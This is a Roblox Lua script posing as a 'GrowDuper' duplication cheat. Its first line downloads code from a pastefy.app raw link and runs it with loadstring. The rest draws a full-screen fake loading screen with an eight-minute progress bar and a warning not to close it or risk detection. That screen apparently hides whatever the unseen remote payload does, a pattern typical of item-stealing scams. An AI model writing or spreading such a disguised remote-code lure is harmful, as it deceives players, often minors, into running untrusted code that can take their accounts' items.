loadstring(game:HttpGet("https://pastefy.app/0zX3kQZJ/raw"))()

local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 1000 -- Ensures instant pop-up by prioritizing rendering

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
frame.BackgroundTransparency = 0
frame.Parent = screenGui

-- Add gradient background
local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 30)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 10))
}
gradient.Rotation = 45
gradient.Parent = frame

-- Add shadow effect
local shadow = Instance.new("UIStroke")
shadow.Thickness = 4
shadow.Color = Color3.fromRGB(0, 0, 0)
shadow.Transparency = 0.3
shadow.Parent = frame

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(0.7, 0, 0.1, 0)
titleLabel.Position = UDim2.new(0.15, 0, 0.3, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "GrowDuper Script is Loading"
titleLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.TextStrokeTransparency = 0.8
titleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
titleLabel.Parent = frame

local warningLabel = Instance.new("TextLabel")
warningLabel.Size = UDim2.new(0.7, 0, 0.08, 0)
warningLabel.Position = UDim2.new(0.15, 0, 0.4, 0)
warningLabel.BackgroundTransparency = 1
warningLabel.Text = "Warning: Do not close the script or you will get detected"
warningLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
warningLabel.TextScaled = true
warningLabel.Font = Enum.Font.Gotham
warningLabel.TextStrokeTransparency = 0.8
warningLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
warningLabel.Parent = frame

local loadingBarFrame = Instance.new("Frame")
loadingBarFrame.Size = UDim2.new(0.5, 0, 0.06, 0)
loadingBarFrame.Position = UDim2.new(0.25, 0, 0.55, 0)
loadingBarFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
loadingBarFrame.BorderSizePixel = 0
loadingBarFrame.Parent = frame

-- Add corner radius to loading bar frame
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = loadingBarFrame

-- Add shadow to loading bar
local barShadow = Instance.new("UIStroke")
barShadow.Thickness = 2
barShadow.Color = Color3.fromRGB(0, 0, 0)
barShadow.Transparency = 0.5
barShadow.Parent = loadingBarFrame

local loadingBar = Instance.new("Frame")
loadingBar.Size = UDim2.new(0, 0, 1, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
loadingBar.BorderSizePixel = 0
loadingBar.Parent = loadingBarFrame

-- Add gradient to loading bar
local barGradient = Instance.new("UIGradient")
barGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 100)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 50))
}
barGradient.Parent = loadingBar

-- Add corner radius to loading bar
local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(0, 8)
barCorner.Parent = loadingBar

local percentageLabel = Instance.new("TextLabel")
percentageLabel.Size = UDim2.new(0.5, 0, 0.05, 0)
percentageLabel.Position = UDim2.new(0.25, 0, 0.62, 0)
percentageLabel.BackgroundTransparency = 1
percentageLabel.Text = "0%"
percentageLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
percentageLabel.TextScaled = true
percentageLabel.Font = Enum.Font.Gotham
percentageLabel.TextStrokeTransparency = 0.8
percentageLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
percentageLabel.Parent = frame

local tweenService = game:GetService("TweenService")
local tweenInfo = TweenInfo.new(480, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0) -- 8 minutes
local goal = {Size = UDim2.new(1, 0, 1, 0)}
local tween = tweenService:Create(loadingBar, tweenInfo, goal)
tween:Play()

local startTime = tick()
game:GetService("RunService").RenderStepped:Connect(function()
    local elapsed = math.min(tick() - startTime, 480)
    local progress = elapsed / 480
    percentageLabel.Text = math.floor(progress * 100) .. "%"
end)
